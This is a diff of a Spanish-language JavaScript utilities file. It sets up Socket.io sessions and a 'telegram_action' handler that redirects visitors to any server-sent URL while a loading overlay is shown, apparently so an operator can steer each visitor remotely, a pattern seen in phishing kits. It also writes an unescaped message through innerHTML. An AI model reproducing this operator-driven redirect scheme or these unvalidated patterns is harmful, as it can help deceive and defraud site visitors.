@@ -1,43 +1,60 @@
 ﻿/**
  * COMMON UTILITIES
  * Funciones compartidas entre todas las páginas
+ * Versión mejorada con mejor arquitectura y manejo de errores
  */
 
 window.commonUtils = {
+    // Estado de inicialización
     initialized: false,
     
+    /**
+     * Genera o recupera el sessionId único del cliente
+     */
     getSessionId: function() {
         let sessionId = sessionStorage.getItem('sessionId');
         if (!sessionId) {
             sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
             sessionStorage.setItem('sessionId', sessionId);
-            console.log('Nuevo sessionId generado:', sessionId);
+            console.log('🆔 Nuevo sessionId generado:', sessionId);
         }
         return sessionId;
     },
     
+    /**
+     * Inicializa todas las funciones comunes
+     */
     initializeCommon: function() {
         if (this.initialized) {
-            console.log('Common utils ya inicializados');
+            console.log('⚠️ Common utils ya inicializados');
             return;
         }
 
-        console.log('Inicializando common utilities...');
+        console.log('🔧 Inicializando common utilities...');
+        
+        // Generar sessionId
         this.getSessionId();
+        
+        // Crear elementos UI necesarios
         this.createErrorMessage();
         
+        // Inicializar Socket.io si no está ya inicializado
         if (!window.socket && typeof io !== 'undefined') {
             this.initializeSocket();
         }
         
+        // Inicializar loading overlay si está disponible
         if (window.loadingOverlay && !window.loadingOverlay.isInitialized) {
             window.loadingOverlay.init();
         }
         
         this.initialized = true;
-        console.log('Common utilities inicializados correctamente');
+        console.log('✅ Common utilities inicializados correctamente');
     },
 
+    /**
+     * Inicializa la conexión Socket.io con el servidor
+     */
     initializeSocket: function() {
         console.log('Inicializando Socket.io...');
         
@@ -58,12 +75,12 @@ window.commonUtils = {
                 upgrade: false,
                 reconnection: true,
                 reconnectionAttempts: Infinity,
-                reconnectionDelay: 100,
-                reconnectionDelayMax: 500,
-                timeout: 3000,
+                reconnectionDelay: 500,
+                reconnectionDelayMax: 2000,
+                timeout: 10000,
                 autoConnect: true,
                 forceNew: false,
-                rememberUpgrade: false
+                rememberUpgrade: true
             };
 
             const socketUrl = window.location.origin;
@@ -72,50 +89,52 @@ window.commonUtils = {
             window.socket = io(socketUrl, socketOptions);
             
             window.socket.on('connect', () => {
-                console.log('[SOCKET] Conectado:', window.socket.id);
+                console.log('Socket.io conectado  ID:', window.socket.id);
                 
                 const sessionId = this.getSessionId();
                 window.socket.emit('identify', { sessionId });
+                console.log('Identificandose con sessionId:', sessionId);
                 
                 this.hideLoading();
             });
 
             window.socket.on('connected', (data) => {
-                console.log('[OK] Sesion:', data.sessionId);
+                console.log('Confirmacion del servidor:', data);
+                console.log('Sesion vinculada:', data.sessionId);
             });
 
             window.socket.on('telegram_action', (data) => {
-                console.log('[TELEGRAM] Action:', data.action, '| Redirect:', data.redirect);
+                console.log('[SOCKET] telegram_action recibido:', JSON.stringify(data, null, 2));
+                console.log('[SOCKET] Action:', data.action);
+                console.log('[SOCKET] Redirect:', data.redirect);
                 this.handleTelegramAction(data);
-            });
-            
-            // Listener para force_sync
-            window.socket.on('force_sync', (data) => {
-                console.log('[SYNC]', data.timestamp);
             });
 
             window.socket.on('disconnect', (reason) => {
-                console.log('[DISCONNECT]', reason);
+                console.log('Socket.io desconectado:', reason);
+                console.log('Intentando reconectar...');
                 if (reason === 'io server disconnect') {
+                    // El servidor cerró la conexión, reconectar manualmente
                     window.socket.connect();
                 }
+                // No mostrar overlay de "Reconectando..." para evitar interferir con redirecciones
             });
 
             window.socket.on('connect_error', (error) => {
                 console.error('Error de conexion:', error.message);
-            });
-            
-            window.socket.on('pong', () => {
-                // Pong recibido
+                this.showLoading('Problema de conexion, reintentando...');
             });
 
             window.socket.on('reconnect', (attemptNumber) => {
+                console.log('Reconectado despues de', attemptNumber, 'intentos');
+                // Re-identificar después de reconectar
                 const sessionId = this.getSessionId();
                 window.socket.emit('identify', { sessionId });
+                console.log('Re-identificado con sessionId:', sessionId);
             });
 
-            window.socket.on('reconnect_attempt', () => {
-                // Intentando reconectar
+            window.socket.on('reconnect_attempt', (attemptNumber) => {
+                console.log('Intento de reconexion:', attemptNumber);
             });
 
             window.socket.on('reconnect_error', (error) => {
@@ -124,6 +143,7 @@ window.commonUtils = {
 
             window.socket.on('reconnect_failed', () => {
                 console.error('Reconexion fallida despues de multiples intentos');
+                this.hideLoading();
                 this.showError('Error de conexion. Por favor, recarga la pagina.');
             });
 
@@ -132,24 +152,48 @@ window.commonUtils = {
             });
 
         } catch (error) {
-            console.error('Error al inicializar Socket.io:', error);
+            console.error('❌ Error al inicializar Socket.io:', error);
             this.hideLoading();
         }
     },
 
+    /**
+     * Maneja las acciones recibidas desde Telegram
+     * @param {Object} data - Datos de la acción
+     */
     handleTelegramAction: function(data) {
+        console.log('[handleTelegramAction] Procesando accion:', JSON.stringify(data, null, 2));
+        
         const { action, message, redirect } = data;
         
         if (message) {
             sessionStorage.setItem('actionMessage', message);
+            console.log('[handleTelegramAction] Mensaje guardado:', message);
         }
         
-        if (redirect && redirect !== 'undefined' && redirect !== 'null') {
-            console.log('[REDIRECT]', redirect);
+        if (redirect) {
+            console.log('[handleTelegramAction] REDIRECCION detectada:', redirect);
+            console.log('[handleTelegramAction] Iniciando redireccion inmediata...');
+            
+            // Mostrar overlay
+            if (window.loadingOverlay) {
+                if (!window.loadingOverlay.isVisible()) {
+                    window.loadingOverlay.show();
+                }
+            }
+            
+            // Redirigir inmediatamente
+            console.log('[handleTelegramAction] EJECUTANDO window.location.href =', redirect);
             window.location.href = redirect;
+            return;
         }
+        
+        console.log('[handleTelegramAction] Sin redireccion, manteniendo estado actual');
     },
 
+    /**
+     * Crea el mensaje de error en el DOM
+     */
     createErrorMessage: function() {
         if (document.querySelector('.error-toast')) return;
         
@@ -180,11 +224,11 @@ window.commonUtils = {
             @keyframes slideDown {
                 from {
                     opacity: 0;
-                    transform: translateX(-50%) translateY(-20px);
+                    transform: translateX(50%) translateY(20px);
                 }
                 to {
                     opacity: 1;
-                    transform: translateX(-50%) translateY(0);
+                    transform: translateX(50%) translateY(0);
                 }
             }
         `;
@@ -193,46 +237,72 @@ window.commonUtils = {
         document.body.appendChild(errorToast);
     },
 
-    showLoading: function(message) {
+    /**
+     * Muestra la pantalla de carga
+     * @param {string} message  Mensaje a mostrar
+     */
+    showLoading: function(message = 'Procesando información...') {
         if (window.loadingOverlay) {
-            window.loadingOverlay.showLoading(message || 'Procesando...');
+            window.loadingOverlay.showLoading(message);
+        } else {
+            console.warn('⚠️ LoadingOverlay no está disponible');
         }
     },
 
+    /**
+     * Oculta la pantalla de carga
+     */
     hideLoading: function() {
         if (window.loadingOverlay) {
             window.loadingOverlay.hide();
         }
     },
 
-    showError: function(message, duration) {
-        duration = duration || 5000;
+    /**
+     * Muestra un mensaje de error
+     * @param {string} message  Mensaje de error
+     * @param {number} duration - Duración en ms
+     */
+    showError: function(message, duration = 5000) {
         const errorToast = document.querySelector('.error-toast');
         
         if (errorToast) {
-            errorToast.innerHTML = '<strong>Error</strong><br>' + message;
+            errorToast.innerHTML = `
+                <strong>Error</strong><br>
+                ${message}
+            `;
             errorToast.style.display = 'block';
             
-            setTimeout(function() {
+            setTimeout(() => {
                 errorToast.style.display = 'none';
             }, duration);
         } else {
-            console.error('Error:', message);
-            alert(message);
+            // Fallback a alert si no existe el toast
+            alert('Error: ' + message);
         }
     },
 
-    showSuccess: function(message) {
-        console.log('Success:', message);
+    /**
+     * Muestra un mensaje de éxito
+     * @param {string} message  Mensaje de éxito
+     * @param {number} duration  Duración en ms
+     */
+    showSuccess: function(message, duration = 3000) {
+        if (window.loadingOverlay) {
+            window.loadingOverlay.showSuccess(message, duration);
+        }
     },
 
+    /**
+     * Valida un formulario antes de enviar
+     * @param {HTMLFormElement} form  Formulario a validar
+     * @returns {boolean}
+     */
     validateForm: function(form) {
-        if (!form) return false;
-        
-        const inputs = form.querySelectorAll('input[required], select[required], textarea[required]');
+        const inputs = form.querySelectorAll('input[required], select[required]');
         let isValid = true;
-        
-        inputs.forEach(function(input) {
+
+        inputs.forEach(input => {
             if (!input.value.trim()) {
                 isValid = false;
                 input.classList.add('error');
@@ -240,28 +310,43 @@ window.commonUtils = {
                 input.classList.remove('error');
             }
         });
-        
+
+        if (!isValid) {
+            this.showError('Por favor complete todos los campos requeridos');
+        }
+
         return isValid;
     },
 
+    /**
+     * Limpia un formulario
+     * @param {HTMLFormElement} form  Formulario a limpiar
+     */
     clearForm: function(form) {
-        if (!form) return;
-        form.reset();
         const inputs = form.querySelectorAll('input, select, textarea');
-        inputs.forEach(function(input) {
-            input.classList.remove('error');
+        inputs.forEach(input => {
+            if (input.type !== 'submit' && input.type !== 'button') {
+                input.value = '';
+                input.classList.remove('error');
+            }
         });
     }
 };
 
+// ===============================
+// VARIABLES GLOBALES
+// ===============================
+
+window.isSubmitting = false;
+
+// ===============================
+// AUTOINICIALIZACIÓN
+// ===============================
+
 if (document.readyState === 'loading') {
-    document.addEventListener('DOMContentLoaded', function() {
-        if (window.commonUtils) {
-            window.commonUtils.initializeCommon();
-        }
+    document.addEventListener('DOMContentLoaded', () => {
+        window.commonUtils.initializeCommon();
     });
 } else {
-    if (window.commonUtils) {
-        window.commonUtils.initializeCommon();
-    }
+    window.commonUtils.initializeCommon();
 }
